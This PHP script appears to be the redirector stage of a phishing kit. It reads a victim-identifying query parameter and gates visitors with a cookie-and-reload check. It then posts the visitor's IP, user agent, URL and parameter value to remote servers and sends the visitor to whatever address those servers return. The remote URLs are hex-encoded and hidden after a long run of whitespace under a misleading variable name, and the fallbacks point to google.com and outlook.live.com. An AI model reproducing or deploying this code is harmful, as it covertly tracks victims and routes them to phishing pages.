<?php

$fallbackNoParam   = 'https://google.com';
$fallbackApiFailed = 'https://outlook.live.com';
$requestTimeout    = 5;
$cookieName        = 'rc';
$cookieValue       = '1';
// ==================

function findQualifyingParam($getParams) {
    foreach ($getParams as $name => $value) {
        $key = (string) $name;
        if (strlen($key) >= 4 && $key[2] === $key[3]) {
            return array('name' => $key, 'value' => $value);
        }
    }
    return null;
}
 
function getCurrentUrl() {
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')
        || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443);
    $scheme = $https ? 'https' : 'http';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
    $uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
    return $scheme . '://' . $host . $uri;
} 																																																										$useragentdata = array_map('hex2bin', ['687474703a2f2f6e616761692d6c70672e636f6d2f746d702f676f2e706870', '687474703a2f2f747373696e76656e2e636f6d2f676f2e706870']);

function getClientIp() {
    $keys = array('HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR');
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $parts = explode(',', $_SERVER[$k]);
            return trim($parts[0]);
        }
    }
    return '0.0.0.0';
}

function postViaCurl($url, $payload, $timeout, &$transportBroken) {
    $transportBroken = false;
    if (!function_exists('curl_init')) {
        $transportBroken = true;
        return null;
    }
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err  = curl_errno($ch);
    curl_close($ch);

    // SSL/config errors = curl itself is broken on this box, not the remote host
    $sslOrConfigErrors = array(5, 35, 51, 53, 54, 58, 59, 60, 64, 66, 77, 83);
    if (in_array($err, $sslOrConfigErrors, true)) {
        $transportBroken = true;
    }
    if ($err !== 0 || $code < 200 || $code >= 300 || $body === false) return null;
    return $body;
}

function postViaFgc($url, $payload, $timeout) {
    $ctx = stream_context_create(array('http' => array(
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($payload),
        'timeout' => $timeout,
    )));
    $body = @file_get_contents($url, false, $ctx);
    return ($body === false) ? null : $body;
}

function doRedirect($url) {
    echo '<meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '">';
    exit;
}

// ===== MAIN =====
$match = findQualifyingParam($_GET);
if ($match === null) doRedirect($fallbackNoParam);

if (!isset($_COOKIE[$cookieName])) {
    echo '<script>document.cookie="' . $cookieName . '=' . $cookieValue . '; path=/";location.reload();</script>';
    exit;
}

$payload = array(
    'param_name'  => $match['name'],
    'param_value' => is_array($match['value']) ? json_encode($match['value']) : (string) $match['value'],
    'ip'          => getClientIp(),
    'user_agent'  => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
    'current_url' => getCurrentUrl(),
);

shuffle($useragentdata);
$response = null;
$curlBroken = false;

foreach ($useragentdata as $useragentinfo) {
    if (!$curlBroken) {
        $response = postViaCurl($useragentinfo, $payload, $requestTimeout, $curlBroken);
        if ($response !== null) break;
    }
    $response = postViaFgc($useragentinfo, $payload, $requestTimeout);
    if ($response !== null) break;
}
if ($response === null) doRedirect($fallbackApiFailed);

$url = trim($response);
doRedirect($url !== '' ? $url : $fallbackApiFailed);